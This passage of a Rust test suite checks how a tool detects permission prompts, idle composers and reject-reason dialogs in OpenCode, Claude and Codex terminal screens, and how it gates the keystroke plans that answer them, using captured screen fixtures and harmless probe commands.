                            .collect::<Vec<_>>()
                            .as_slice(),
                        "{backend:?} {decision:?} rests on its pre-stage captures"
                    );
                    for &other in CodingAgent::all().iter().filter(|&&other| other != backend) {
                        assert!(
                            bundled
                                .answer_plan(
                                    other,
                                    profile.version,
                                    rule,
                                    &AnswerKey::Decision(decision)
                                )
                                .is_none(),
                            "{other:?} {}",
                            profile.version
                        );
                    }
                }
            }
        }

        #[test]
        fn episodes_close_not_visible_once_the_idle_composer_holds_250_ms() {
            for (profile, permission, idle, idle_rule) in [
                (
                    CLAUDE,
                    "claude-2.1.302-default-permission-1",
                    "claude-2.1.302-idle-composer-1",
                    "claude-idle-composer",
                ),
                (
                    CODEX,
                    "codex-0.163.0-on-request-permission-1",
                    "codex-0.163.0-idle-composer-1",
                    "codex-idle-composer",
                ),
            ] {
                let observe = |id| bundled_observe(profile.backend, profile.version, id);
                let permission = observe(permission);
                let idle = observe(idle);
                assert_eq!(idle.rule_id, idle_rule);
                assert!(idle.verified_noninteraction, "{idle_rule}");
                let at = |observation: &ScreenObservation, output_seq: u64| {
                    let mut replayed = observation.clone();
                    replayed.output_seq = output_seq;
                    replayed.raw_evidence["screen_seq"] = json!(output_seq);
                    replayed
                };
                let origin = Instant::now();
                let mut tracker = tracker();
                open(&mut tracker, &at(&permission, 1), origin);
                let mut closed_at = |observation: &ScreenObservation, output_seq, millis| {
                    let update = tracker
                        .observe(
                            &at(observation, output_seq),
                            origin + Duration::from_millis(millis),
                            NOW,
                        )
                        .unwrap();
                    update
                        .transitions
                        .into_iter()
                        .filter(|t| t.kind == RuntimeEventKind::InteractionClosed)
                        .collect::<Vec<_>>()
                };
                assert!(
                    closed_at(&idle, 2, 200).is_empty(),
                    "{idle_rule}: idle shown for 0 ms stays open"
                );
                assert!(
                    closed_at(&permission, 3, 300).is_empty(),
                    "{idle_rule}: an idle flash under 250 ms keeps the episode"
                );
                assert!(closed_at(&idle, 4, 400).is_empty(), "{idle_rule}");
                let closes = closed_at(&idle, 5, 650);
                assert_eq!(closes.len(), 1, "{idle_rule}: {closes:?}");
                assert_eq!(
                    closes[0].close_reason,
                    Some(InteractionCloseReason::NotVisible)
                );
            }
        }
    }

    mod bundled_opencode {
        use crate::coding_agent::catalog::tests::*;
        use std::collections::BTreeSet;

        const OPENCODE_VERSION: &str = "2.1.4";
        const PERMISSION_RULE: &str = "opencode-shell-permission";
        const REASON_RULE: &str = "opencode-reject-reason";
        const COMPACT_RULE: &str = "opencode-shell-permission-compact";
        const COMPACT_REASON_RULE: &str = "opencode-reject-reason-compact";
        const IDLE_RULE: &str = "opencode-idle-composer";
        const PERMISSION_FIXTURE: &str = "opencode-2.1.4-ask-permission-1";
        const ALLOW_FIXTURE: &str = "opencode-2.1.4-allow-pre-stage-1";
        const DENY_1_FIXTURE: &str = "opencode-2.1.4-deny-pre-stage-1";
        const DENY_2_FIXTURE: &str = "opencode-2.1.4-deny-pre-stage-2";
        const DENY_3_FIXTURE: &str = "opencode-2.1.4-deny-pre-stage-3";
        const ALWAYS_FIXTURE: &str = "opencode-2.1.4-focus-always-1";
        const IDLE_FIXTURE: &str = "opencode-2.1.4-idle-composer-1";
        const NARROW_FIXTURE: &str = "opencode-2.1.4-narrow-permission-057-1";
        const NARROW_DENY_2_FIXTURE: &str = "opencode-2.1.4-narrow-deny-pre-stage-2-057-1";
        const NARROW_DENY_3_FIXTURE: &str = "opencode-2.1.4-narrow-deny-pre-stage-3-057-1";
        const NARROW_LONG_FIXTURE: &str = "opencode-2.1.4-narrow-long-command-057-1";
        const NARROW_IDLE_FIXTURE: &str = "opencode-2.1.4-narrow-idle-composer-057-1";
        const COMPACT_FIXTURE: &str = "opencode-2.1.4-compact-permission-055-1";
        const COMPACT_DENY_2_FIXTURE: &str = "opencode-2.1.4-compact-deny-pre-stage-2-055-1";
        const COMPACT_DENY_3_FIXTURE: &str = "opencode-2.1.4-compact-deny-pre-stage-3-055-1";
        const MIN_FIXTURE: &str = "opencode-2.1.4-narrow-permission-min-1";
        const MIN_DENY_2_FIXTURE: &str = "opencode-2.1.4-narrow-deny-pre-stage-2-min-1";
        const MIN_DENY_3_FIXTURE: &str = "opencode-2.1.4-narrow-deny-pre-stage-3-min-1";
        /// Each narrow form fixture, the request rule it matches, its displayed command rows and
        /// the choice its captured backgrounds focus.
        const NARROW_FORMS: [(&str, &str, [&str; 2], &str); 6] = [
            (
                NARROW_FIXTURE,
                PERMISSION_RULE,
                [
                    "/tmp/cafleet-194/opencode-narrow-cells-057/",
                    "permission-probe allow",
                ],
                "allow-once",
            ),
            (
                NARROW_DENY_2_FIXTURE,
                PERMISSION_RULE,
                [
                    "/tmp/cafleet-194/opencode-narrow-deny-002-057/",
                    "permission-probe deny",
                ],
                "deny-once",
            ),
            (
                COMPACT_FIXTURE,
                COMPACT_RULE,
                [
                    "/tmp/cafleet-194/opencode-compact-cells-055/",
                    "permission-probe allow",
                ],
                "allow-once",
            ),
            (
                COMPACT_DENY_2_FIXTURE,
                COMPACT_RULE,
                [
                    "/tmp/cafleet-194/opencode-compact-deny-002-055/",
                    "permission-probe deny",
                ],
                "deny-once",
            ),
            (
                MIN_FIXTURE,
                COMPACT_RULE,
                [
                    "/tmp/cafleet-194/opencode-narrow-",
                    "cells-min/permission-probe allow",
                ],
                "allow-once",
            ),
            (
                MIN_DENY_2_FIXTURE,
                COMPACT_RULE,
                [
                    "/tmp/cafleet-194/opencode-narrow-",
                    "deny-002-min/permission-probe deny",
                ],
                "deny-once",
            ),
        ];
        const FORM_FIXTURES: [(&str, &str, &str); 5] = [
            (PERMISSION_FIXTURE, "opencode-cells-001", "allow"),
            (ALLOW_FIXTURE, "opencode-ans-allow-001", "allow"),
            (DENY_1_FIXTURE, "opencode-ans-deny-001", "deny"),
            (DENY_2_FIXTURE, "opencode-ans-deny-002", "deny"),
            (ALWAYS_FIXTURE, "opencode-focus-always-002", "deny"),
        ];
        const HEADING: &str = "  △ Permission required";
        const CHOICE_ROW: &str = "   Allow once   Always allow   Reject                                             ⇆ select  enter confirm  esc reject";

        type LineChange = Box<dyn Fn(&mut Vec<String>)>;

        fn fixture(id: &str) -> Vec<u8> {
            bundled_fixture(id).into_bytes()
        }

        fn parsed(bytes: &[u8]) -> Value {
            serde_json::from_slice(bytes).unwrap()
        }

        fn lines(bytes: &[u8]) -> Vec<String> {
            parsed(bytes)["lines"]
                .as_array()
                .unwrap()
                .iter()
                .map(|line| line.as_str().unwrap().to_owned())
                .collect()
        }

        fn guarded_fixture(
            id: &str,
            change_screen: impl FnOnce(&mut Value),
        ) -> std::result::Result<ProfileCatalog, CafleetError> {
            crate::coding_agent::catalog::test_support::guarded_fixture(id, |_| {}, change_screen)
        }

        fn replay(bytes: &[u8]) -> ScreenSnapshot {
            replay_changed(bytes, |_| {}, None)
        }

        fn replay_changed(
            bytes: &[u8],
            change: impl FnOnce(&mut Vec<String>),
            cursor: Option<(u16, u16)>,
        ) -> ScreenSnapshot {
            replay_native_fixture(std::str::from_utf8(bytes).unwrap(), change, false, cursor)
        }

        fn detector() -> Detector {
            Detector::new(
                &ProfileCatalog::bundled().unwrap(),
                CodingAgent::Opencode,
                Some(OPENCODE_VERSION),
            )
        }

        fn observe(screen: &ScreenSnapshot) -> ScreenObservation {
            detector().observe(screen).unwrap()
        }

        fn plan(decision: PermissionDecision) -> AnswerPlan {
            ProfileCatalog::bundled()
                .unwrap()
                .answer_plan(
                    CodingAgent::Opencode,
                    OPENCODE_VERSION,
                    PERMISSION_RULE,
                    &AnswerKey::Decision(decision),
                )
                .expect("measured bundled OpenCode answer plan")
        }

        fn focused(screen: &ScreenSnapshot) -> Option<String> {
            let detector = detector();
            let mut resolved = BTreeSet::new();
            for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                let matched = detector
                    .match_answer(screen, &plan(decision))
                    .unwrap()
                    .expect("the form matches both plans whatever its focus");
                resolved.insert(matched.focused_choice_id().map(str::to_owned));
            }
            assert_eq!(resolved.len(), 1, "both plans share the focus matcher");
            resolved.pop_first().unwrap()
        }

        fn assert_form(observation: &ScreenObservation, case: &str, probe: &str) {
            assert_eq!(
                observation.kind,
                ObservationKind::Interaction(InteractionClass::PermissionRequest),
                "{case}"
            );
            assert_eq!(observation.rule_id, PERMISSION_RULE, "{case}");
            assert_eq!(
                observation.match_evidence,
                MatchEvidence::Complete,
                "{case}"
            );
            assert_eq!(observation.raw_evidence["native_version"], OPENCODE_VERSION);
            assert!(!observation.verified_noninteraction);
            assert_eq!(
                observation.raw_evidence["operation"],
                json!(format!("/tmp/cafleet-194/{case}/permission-probe {probe}")),
                "{case}"
            );
            assert_eq!(observation.raw_evidence["operation_rows"], json!(1));
            assert_eq!(
                observation.raw_evidence["choices"],
                json!(["Allow once", "Reject"])
            );
            assert_eq!(observation.raw_evidence["native_request_id"], Value::Null);
            assert_eq!(observation.native_correlation, None);
            let region = observation.matched_region.expect("live form region");
            assert_eq!((region.top, region.bottom), (10, 22), "{case}");
        }

        #[test]
        fn bundled_opencode_compact_answers_repeat_the_measured_stages_on_the_compact_rules() {
            let catalog = ProfileCatalog::bundled().unwrap();
            for (decision, choice, stages) in [
                (
                    PermissionDecision::Allow,
                    "allow-once",
                    vec![(vec![0x0d], Some("allow-once"), None)],
                ),
                (
                    PermissionDecision::Deny,
                    "deny-once",
                    vec![
                        (vec![0x68], Some("allow-once"), None),
                        (vec![0x0d], Some("deny-once"), None),
                        (vec![0x0d], None, Some(COMPACT_REASON_RULE)),
                    ],
                ),
            ] {
                let plan = catalog
                    .answer_plan(
                        CodingAgent::Opencode,
                        OPENCODE_VERSION,
                        COMPACT_RULE,
                        &AnswerKey::Decision(decision),
                    )
                    .unwrap_or_else(|| panic!("compact {decision:?} plan"));
                assert_eq!(plan.choice_id(), choice);
                assert_eq!(plan.focus_matcher_id(), "focus");
                assert_eq!(
                    plan.stages()
                        .iter()
                        .map(|stage| (
                            stage.bytes().to_vec(),
                            stage.required_focus_choice_id(),
                            stage.required_screen_rule_id(),
                        ))
                        .collect::<Vec<_>>(),
                    stages,
                    "{decision:?}"
                );
                for stage in plan.stages() {
                    assert_eq!(stage.required_rule_id(), COMPACT_RULE);
                    assert_eq!(stage.required_choice_id(), choice);
                }
                let capability = plan.capability();
                assert_eq!(capability.request_rule_id(), COMPACT_RULE);
                assert_eq!(capability.key(), &AnswerKey::Decision(decision));
                let fixtures = if decision == PermissionDecision::Allow {
                    BTreeSet::from([COMPACT_FIXTURE, MIN_FIXTURE])
                } else {
                    BTreeSet::from([
                        COMPACT_FIXTURE,
                        COMPACT_DENY_2_FIXTURE,
                        COMPACT_DENY_3_FIXTURE,
                        MIN_FIXTURE,
                        MIN_DENY_2_FIXTURE,
                        MIN_DENY_3_FIXTURE,
                    ])
                };
                assert_eq!(
                    capability
                        .fixture_ids()
                        .iter()
                        .map(String::as_str)
                        .collect::<BTreeSet<_>>(),
                    fixtures,
                    "{decision:?}"
                );
                let wide = plan_for(PERMISSION_RULE, decision);
                assert_ne!(
                    capability.answer_rule_id(),
                    wide.capability().answer_rule_id(),
                    "each request rule has its own answer entry"
                );
            }
        }

        fn plan_for(request: &str, decision: PermissionDecision) -> AnswerPlan {
            ProfileCatalog::bundled()
                .unwrap()
                .answer_plan(
                    CodingAgent::Opencode,
                    OPENCODE_VERSION,
                    request,
                    &AnswerKey::Decision(decision),
                )
                .unwrap()
        }

        fn focused_on(request: &str, screen: &ScreenSnapshot) -> Option<String> {
            let detector = detector();
            let mut resolved = BTreeSet::new();
            for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                let matched = detector
                    .match_answer(screen, &plan_for(request, decision))
                    .unwrap()
                    .unwrap_or_else(|| panic!("the {request} form matches the {decision:?} plan"));
                resolved.insert(matched.focused_choice_id().map(str::to_owned));
            }
            assert_eq!(resolved.len(), 1, "both plans share the focus matcher");
            resolved.pop_first().unwrap()
        }

        #[test]
        fn bundled_opencode_detects_every_narrow_and_compact_form_fixture() {
            for (id, request, rows, focus) in NARROW_FORMS {
                let observed = observe(&replay(&fixture(id)));
                assert_eq!(
                    observed.kind,
                    ObservationKind::Interaction(InteractionClass::PermissionRequest),
                    "{id}"
                );
                assert_eq!(observed.rule_id, request, "{id}");
                assert_eq!(observed.match_evidence, MatchEvidence::Complete, "{id}");
                assert!(!observed.verified_noninteraction, "{id}");
                assert_eq!(observed.raw_evidence["operation"], rows.join("\n"), "{id}");
                assert_eq!(observed.raw_evidence["operation_rows"], 2, "{id}");
                assert_eq!(
                    observed.raw_evidence["choices"],
                    json!(["Allow once", "Reject"]),
                    "{id}"
                );
                assert_eq!(
                    observed.raw_evidence["native_request_id"],
                    Value::Null,
                    "{id}"
                );
                assert!(observed.fingerprint.is_some(), "{id}");
                assert_eq!(
                    focused_on(request, &replay(&fixture(id))).as_deref(),
                    Some(focus),
                    "{id}"
                );
            }
        }

        #[test]
        fn bundled_opencode_narrow_stage_gates_hold_on_their_pre_stage_fixtures() {
            for (request, reason, cells, deny_2, deny_3) in [
                (
                    PERMISSION_RULE,
                    REASON_RULE,
                    NARROW_FIXTURE,
                    NARROW_DENY_2_FIXTURE,
                    NARROW_DENY_3_FIXTURE,
                ),
                (
                    COMPACT_RULE,
                    COMPACT_REASON_RULE,
                    COMPACT_FIXTURE,
                    COMPACT_DENY_2_FIXTURE,
                    COMPACT_DENY_3_FIXTURE,
                ),
                (
                    COMPACT_RULE,
                    COMPACT_REASON_RULE,
                    MIN_FIXTURE,
                    MIN_DENY_2_FIXTURE,
                    MIN_DENY_3_FIXTURE,
                ),
            ] {
                let allow = plan_for(request, PermissionDecision::Allow);
                let deny = plan_for(request, PermissionDecision::Deny);
                let cells_focus = focused_on(request, &replay(&fixture(cells)));
                assert_eq!(
                    cells_focus.as_deref(),
                    allow.stages()[0].required_focus_choice_id(),
                    "{cells} allow stage 1"
                );
                assert_eq!(
                    cells_focus.as_deref(),
                    deny.stages()[0].required_focus_choice_id(),
                    "{cells} deny stage 1"
                );
                assert_eq!(
                    focused_on(request, &replay(&fixture(deny_2))).as_deref(),
                    deny.stages()[1].required_focus_choice_id(),
                    "{deny_2}"
                );
                let dialog = observe(&replay(&fixture(deny_3)));
                assert_eq!(
                    dialog.kind,
                    ObservationKind::PermissionContinuation,
                    "{deny_3}"
                );
                assert_eq!(dialog.match_evidence, MatchEvidence::Complete, "{deny_3}");
                assert_eq!(dialog.rule_id, reason, "{deny_3}");
                assert_eq!(
                    Some(dialog.rule_id.as_str()),
                    deny.stages()[2].required_screen_rule_id(),
                    "{deny_3}"
                );
                assert_eq!(
                    dialog.continues_rule_id.as_deref(),
                    Some(request),
                    "{deny_3}"
                );
                for plan in [&allow, &deny] {
                    assert!(
                        detector()
                            .match_answer(&replay(&fixture(deny_3)), plan)
                            .unwrap()
                            .is_none(),
                        "{deny_3}: the rejection-reason dialog is not an answerable form"
                    );
                }
            }
        }

        #[test]
        fn bundled_opencode_narrow_reject_dialogs_require_the_empty_placeholder() {
            for id in [
                NARROW_DENY_3_FIXTURE,
                COMPACT_DENY_3_FIXTURE,
                MIN_DENY_3_FIXTURE,
            ] {
                let placeholder = lines(&fixture(id))
                    .iter()
                    .rposition(|line| line.contains("Tell OpenCode what to do differently"))
                    .expect("the dialog shows its placeholder");
                let typed = observe(&replay_changed(
                    &fixture(id),
                    |lines| {
                        lines[placeholder] = lines[placeholder].replacen(
                            "Tell OpenCode what to do differently",
                            "run it in the sandbox instead       ",
                            1,
                        )
                    },
                    None,
                ));
                assert_ne!(typed.kind, ObservationKind::PermissionContinuation, "{id}");
                assert_ne!(typed.rule_id, REASON_RULE, "{id}");
                assert_ne!(typed.rule_id, COMPACT_REASON_RULE, "{id}");
            }
        }

        #[test]
        fn bundled_opencode_clipped_long_command_yields_no_request() {
            let observed = observe(&replay(&fixture(NARROW_LONG_FIXTURE)));
            assert_ne!(
                observed.kind,
                ObservationKind::Interaction(InteractionClass::PermissionRequest)
            );
            assert_ne!(observed.rule_id, PERMISSION_RULE);
            assert_ne!(observed.rule_id, COMPACT_RULE);
            assert!(observed.fingerprint.is_none());
            for request in [PERMISSION_RULE, COMPACT_RULE] {
                for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                    assert!(
                        detector()
                            .match_answer(
                                &replay(&fixture(NARROW_LONG_FIXTURE)),
                                &plan_for(request, decision)
                            )
                            .unwrap()
                            .is_none(),
                        "{request} {decision:?}"
                    );
                }
            }
        }

        #[test]
        fn bundled_opencode_narrow_idle_composer_is_a_verified_empty_composer() {
            let observed = observe(&replay(&fixture(NARROW_IDLE_FIXTURE)));
            assert_eq!(observed.kind, ObservationKind::ComposerEmpty);
            assert_eq!(observed.rule_id, IDLE_RULE);
            assert!(observed.verified_noninteraction);
        }

        #[test]
        fn bundled_opencode_answer_plans_are_the_measured_gated_stages() {
            let allow = plan(PermissionDecision::Allow);
            let deny = plan(PermissionDecision::Deny);
            for (plan, decision, choice, answer_rule, fixtures, stages) in [
                (
                    &allow,
                    PermissionDecision::Allow,
                    "allow-once",
                    "opencode-shell-allow-once",
                    BTreeSet::from([ALLOW_FIXTURE, NARROW_FIXTURE]),
                    vec![(vec![0x0d], Some("allow-once"), None)],
                ),
                (
                    &deny,
                    PermissionDecision::Deny,
                    "deny-once",
                    "opencode-shell-deny-once",
                    BTreeSet::from([
                        DENY_1_FIXTURE,
                        DENY_2_FIXTURE,
                        DENY_3_FIXTURE,
                        NARROW_FIXTURE,
                        NARROW_DENY_2_FIXTURE,
                        NARROW_DENY_3_FIXTURE,
                    ]),
                    vec![
                        (vec![0x68], Some("allow-once"), None),
                        (vec![0x0d], Some("deny-once"), None),
                        (vec![0x0d], None, Some(REASON_RULE)),
                    ],
                ),
            ] {
                assert_eq!(plan.choice_id(), choice);
                assert_eq!(plan.focus_matcher_id(), "focus");
                let actual = plan
                    .stages()
                    .iter()
                    .map(|stage| {
                        assert_eq!(stage.required_rule_id(), PERMISSION_RULE);
                        assert_eq!(stage.required_choice_id(), choice);
                        assert!(!stage.bytes().contains(&0x1b), "no stage sends Escape");
                        (
                            stage.bytes().to_vec(),
                            stage.required_focus_choice_id(),
                            stage.required_screen_rule_id(),
                        )
                    })
                    .collect::<Vec<_>>();
                assert_eq!(actual, stages, "{decision:?}");
                let capability = plan.capability();
                assert_eq!(capability.backend(), CodingAgent::Opencode);
                assert_eq!(capability.native_version(), OPENCODE_VERSION);
                assert_eq!(capability.request_rule_id(), PERMISSION_RULE);
                assert_eq!(capability.answer_rule_id(), answer_rule);
                assert_eq!(capability.key(), &AnswerKey::Decision(decision));
                assert_eq!(
                    capability
                        .fixture_ids()
                        .iter()
                        .map(String::as_str)
                        .collect::<BTreeSet<_>>(),
                    fixtures,
                    "{decision:?}"
                );
                let bundled = ProfileCatalog::bundled().unwrap();
                for (backend, version, request) in [
                    (CodingAgent::Opencode, OPENCODE_VERSION, REASON_RULE),
                    (CodingAgent::Opencode, OPENCODE_VERSION, IDLE_RULE),
                    (CodingAgent::Codex, OPENCODE_VERSION, PERMISSION_RULE),
                    (CodingAgent::Claude, OPENCODE_VERSION, PERMISSION_RULE),
                ] {
                    assert!(
                        bundled
                            .answer_plan(backend, version, request, &AnswerKey::Decision(decision))
                            .is_none(),
                        "{backend:?} {version} {request}"
                    );
                }
            }
        }

        #[test]
        fn bundled_opencode_detects_each_native_form_from_its_live_region() {
            for (form, case, probe) in FORM_FIXTURES {
                let bytes = fixture(form);
                let observation = observe(&replay(&bytes));
                assert_form(&observation, case, probe);
                assert!(observation.fingerprint.is_some());
            }
            let detector = detector();
            let a = detector.observe(&replay(&fixture(DENY_1_FIXTURE))).unwrap();
            let b = detector.observe(&replay(&fixture(DENY_2_FIXTURE))).unwrap();
            assert!(
                a.fingerprint != b.fingerprint,
                "different cases carry different operations"
            );
            let cursor_elsewhere = observe(&replay_changed(
                &fixture(DENY_1_FIXTURE),
                |_| {},
                Some((5, 0)),
            ));
            assert_form(&cursor_elsewhere, "opencode-ans-deny-001", "deny");
        }

        #[test]
        fn bundled_opencode_focus_resolves_from_the_captured_cell_backgrounds() {
            for (id, expected) in [
                (PERMISSION_FIXTURE, Some("allow-once")),
                (ALLOW_FIXTURE, Some("allow-once")),
                (DENY_1_FIXTURE, Some("allow-once")),
                (DENY_2_FIXTURE, Some("deny-once")),
                (ALWAYS_FIXTURE, None),
            ] {
                let bytes = fixture(id);
                assert_eq!(focused(&replay(&bytes)).as_deref(), expected, "{id}");
            }
            let mut text_only = parsed(&fixture(PERMISSION_FIXTURE));
            text_only
                .as_object_mut()
                .unwrap()
                .remove("cell_backgrounds");
            let text_only = serde_json::to_vec(&text_only).unwrap();
            let screen = replay(&text_only);
            assert_form(&observe(&screen), "opencode-cells-001", "allow");
            assert_eq!(
                focused(&screen),
                None,
                "the form marks focus by cell background only"
            );
        }

        #[test]
        fn bundled_opencode_focus_resolution_is_independent_of_the_theme_colours() {
            for (bytes, expected) in [
                (&fixture(PERMISSION_FIXTURE), Some("allow-once")),
                (&fixture(DENY_2_FIXTURE), Some("deny-once")),
                (&fixture(ALWAYS_FIXTURE), None),
            ] {
                let mut screen = parsed(bytes);
                for run in screen["cell_backgrounds"].as_array_mut().unwrap() {
                    let rgb = (
                        run["bg"]["r"].clone(),
                        run["bg"]["g"].clone(),
                        run["bg"]["b"].clone(),
                    );
                    run["bg"] = if rgb == (json!(250), json!(178), json!(131)) {
                        json!({"kind":"indexed","index":214})
                    } else if rgb == (json!(30), json!(30), json!(30)) {
                        json!({"kind":"rgb","r":238,"g":238,"b":238})
                    } else {
                        json!({"kind":"indexed","index":250})
                    };
                }
                let rethemed = serde_json::to_vec(&screen).unwrap();
                assert_eq!(focused(&replay(&rethemed)).as_deref(), expected);
            }
        }

        #[test]
        fn bundled_opencode_stage_gates_hold_on_their_pre_stage_fixtures() {
            let allow = plan(PermissionDecision::Allow);
            assert_eq!(
                focused(&replay(&fixture(ALLOW_FIXTURE))).as_deref(),
                allow.stages()[0].required_focus_choice_id()
            );
            let deny = plan(PermissionDecision::Deny);
            assert_eq!(
                focused(&replay(&fixture(DENY_1_FIXTURE))).as_deref(),
                deny.stages()[0].required_focus_choice_id()
            );
            assert_eq!(
                focused(&replay(&fixture(DENY_2_FIXTURE))).as_deref(),
                deny.stages()[1].required_focus_choice_id()
            );
            let dialog = observe(&replay(&fixture(DENY_3_FIXTURE)));
            assert_eq!(dialog.kind, ObservationKind::PermissionContinuation);
            assert_eq!(dialog.match_evidence, MatchEvidence::Complete);
            assert_eq!(
                Some(dialog.rule_id.as_str()),
                deny.stages()[2].required_screen_rule_id()
            );
            assert!(!dialog.verified_noninteraction);
            for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                assert!(
                    detector()
                        .match_answer(&replay(&fixture(DENY_3_FIXTURE)), &plan(decision))
                        .unwrap()
                        .is_none(),
                    "the rejection-reason dialog is not an answerable form"
                );
            }
            let always = focused(&replay(&fixture(ALWAYS_FIXTURE)));
            for stage in allow.stages().iter().chain(deny.stages()) {
                if let Some(gate) = stage.required_focus_choice_id() {
                    assert_ne!(
                        always.as_deref(),
                        Some(gate),
                        "no focus gate holds on Always allow"
                    );
                }
            }
        }

        #[test]
        fn bundled_opencode_reject_reason_requires_the_empty_placeholder_textarea() {
            let typed = observe(&replay_changed(
                &fixture(DENY_3_FIXTURE),
                |lines| {
                    lines[21] = lines[21].replacen(
                        "Tell OpenCode what to do differently",
                        "run it in the sandbox instead      ",
                        1,
                    )
                },
                None,
            ));
            assert_ne!(typed.kind, ObservationKind::PermissionContinuation);
            assert_ne!(typed.rule_id, REASON_RULE);
            let appended = observe(&replay_changed(
                &fixture(DENY_3_FIXTURE),
                |lines| {
                    lines[21] = lines[21].replacen(
                        "Tell OpenCode what to do differently ",
                        "Tell OpenCode what to do differently!",
                        1,
                    )
                },
                None,
            ));
            assert_ne!(
                appended.rule_id, REASON_RULE,
                "the span equals the placeholder exactly"
            );
            let without_prompt = observe(&replay_changed(
                &fixture(DENY_3_FIXTURE),
                |lines| lines[12] = String::new(),
                None,
            ));
            assert_ne!(without_prompt.rule_id, REASON_RULE);
        }

        #[test]
        fn bundled_opencode_idle_composer_is_a_verified_non_interaction_boundary() {
            let idle = observe(&replay(&fixture(IDLE_FIXTURE)));
            assert_eq!(idle.kind, ObservationKind::ComposerEmpty);
            assert_eq!(idle.match_evidence, MatchEvidence::Complete);
            assert!(idle.verified_noninteraction);
            assert_eq!(idle.rule_id, IDLE_RULE);
            assert_eq!(idle.raw_evidence["operation"], Value::Null);
            assert!(idle.fingerprint.is_none());
            let draft = observe(&replay_changed(
                &fixture(IDLE_FIXTURE),
                |lines| lines[11] = "┃ hello".into(),
                Some((11, 7)),
            ));
            assert_ne!(draft.kind, ObservationKind::ComposerEmpty, "typed draft");
            assert!(!draft.verified_noninteraction);
            let away = observe(&replay_changed(
                &fixture(IDLE_FIXTURE),
                |_| {},
                Some((11, 0)),
            ));
            assert_ne!(
                away.kind,
                ObservationKind::ComposerEmpty,
                "cursor before the prefix end"
            );
            assert!(!away.verified_noninteraction);
            let working = observe(&replay(&fixture(PERMISSION_FIXTURE)));
            assert!(!working.verified_noninteraction);
            assert_ne!(working.kind, ObservationKind::ComposerEmpty);
        }

        #[test]
        fn bundled_opencode_detects_nothing_from_form_or_dialog_text_outside_a_live_region() {
            let form = lines(&fixture(PERMISSION_FIXTURE));
            let dialog = lines(&fixture(DENY_3_FIXTURE));
            let cases: [(&str, LineChange); 6] = [
                ("idle screen", Box::new(|_| {})),
                (
                    "quoted heading and command in the transcript",
                    Box::new(|lines: &mut Vec<String>| {
                        lines[5] = HEADING.into();
                        lines[6] =
                            "  $ /tmp/cafleet-194/opencode-cells-001/permission-probe allow".into();
                    }),
                ),
                (
                    "quoted form without its control line",
                    Box::new(move |lines: &mut Vec<String>| {
                        lines[..11].clone_from_slice(&form[10..21]);
                    }),
                ),
                (
                    "quoted control line without its heading",
                    Box::new(|lines: &mut Vec<String>| lines[5] = CHOICE_ROW.into()),
                ),
                (
                    "heading and control line too far apart",
                    Box::new(|lines: &mut Vec<String>| {
                        lines[0] = HEADING.into();
                        lines[34] = CHOICE_ROW.into();
                    }),
                ),
                (
                    "quoted reject dialog without its control line",
                    Box::new(move |lines: &mut Vec<String>| {
                        lines[5] = dialog[10].clone();
                        lines[7] = dialog[12].clone();
                    }),
                ),
            ];
            for (case, change) in cases {
                let observation = observe(&replay_changed(
                    &fixture(IDLE_FIXTURE),
                    |lines| change(lines),
                    None,
                ));
                assert!(
                    !matches!(
                        observation.kind,
                        ObservationKind::Interaction(_) | ObservationKind::PermissionContinuation
                    ),
                    "{case} must not open a request"
                );
                assert_ne!(observation.rule_id, PERMISSION_RULE, "{case}");
                assert_ne!(observation.rule_id, REASON_RULE, "{case}");
            }
        }

        #[test]
        fn bundled_opencode_replay_paints_each_captured_background_run() {
            let screen = replay(&fixture(PERMISSION_FIXTURE));
            let bg = |row: u16, col: u16| screen.screen.cell(row, col).unwrap().bgcolor();
            assert_eq!(bg(21, 0), vt100::Color::Rgb(30, 30, 30));
            for col in 2..14 {
                assert_eq!(bg(21, col), vt100::Color::Rgb(250, 178, 131), "col {col}");
            }
            assert_eq!(bg(21, 14), vt100::Color::Rgb(30, 30, 30));
            assert_eq!(bg(10, 0), vt100::Color::Rgb(20, 20, 20));
            assert_eq!(bg(3, 0), vt100::Color::Default);
            assert_eq!(bg(23, 0), vt100::Color::Default);
            assert_eq!(
                screen.screen.cell(21, 3).unwrap().contents(),
                "A",
                "the repaint keeps the captured text"
            );
            let idle = replay(&fixture(IDLE_FIXTURE));
            for row in 0..36 {
                for col in 0..120 {
                    assert_eq!(
                        idle.screen.cell(row, col).unwrap().bgcolor(),
                        vt100::Color::Default,
                        "an absent key means every cell has the default background"
                    );
                }
            }
        }

        #[test]
        fn bundled_guard_accepts_the_opencode_fixtures_and_rejects_altered_backgrounds() {
            let run = |row: u64, start: u64, end: u64, bg: Value| json!({"row":row,"start_col":start,"end_col":end,"bg":bg});
            let rgb = json!({"kind":"rgb","r":1,"g":2,"b":3});
            for (case, runs) in [
                (
                    "indexed colour",
                    json!([run(30, 0, 4, json!({"kind":"indexed","index":255}))]),
                ),
                (
                    "adjacent runs",
                    json!([
                        run(30, 0, 4, rgb.clone()),
                        run(30, 4, 8, json!({"kind":"indexed","index":3}))
                    ]),
                ),
                ("full-width run", json!([run(30, 0, 120, rgb.clone())])),
            ] {
                assert!(
                    guarded_fixture(IDLE_FIXTURE, |s| s["cell_backgrounds"] = runs).is_ok(),
                    "{case} is a valid run set"
                );
            }
            for (case, runs) in [
                (
                    "row below the geometry",
                    json!([run(36, 0, 4, rgb.clone())]),
                ),
                (
                    "end past the width",
                    json!([run(30, 100, 121, rgb.clone())]),
                ),
                ("masked row", json!([run(35, 0, 4, rgb.clone())])),
                ("empty run", json!([run(30, 4, 4, rgb.clone())])),
                ("reversed run", json!([run(30, 8, 4, rgb.clone())])),
                (
                    "overlapping runs",
                    json!([run(30, 0, 6, rgb.clone()), run(30, 5, 9, rgb.clone())]),
                ),
                (
                    "default colour",
                    json!([run(30, 0, 4, json!({"kind":"default"}))]),
                ),
                (
                    "unknown colour kind",
                    json!([run(30, 0, 4, json!({"kind":"named","name":"red"}))]),
                ),
                (
                    "rgb component out of range",
                    json!([run(30, 0, 4, json!({"kind":"rgb","r":256,"g":0,"b":0}))]),
                ),
                (
                    "rgb component missing",
                    json!([run(30, 0, 4, json!({"kind":"rgb","r":1,"g":2}))]),
                ),
                (
                    "rgb extra field",
                    json!([run(30, 0, 4, json!({"kind":"rgb","r":1,"g":2,"b":3,"a":4}))]),
                ),
                (
                    "indexed out of range",
                    json!([run(30, 0, 4, json!({"kind":"indexed","index":256}))]),
                ),
                (
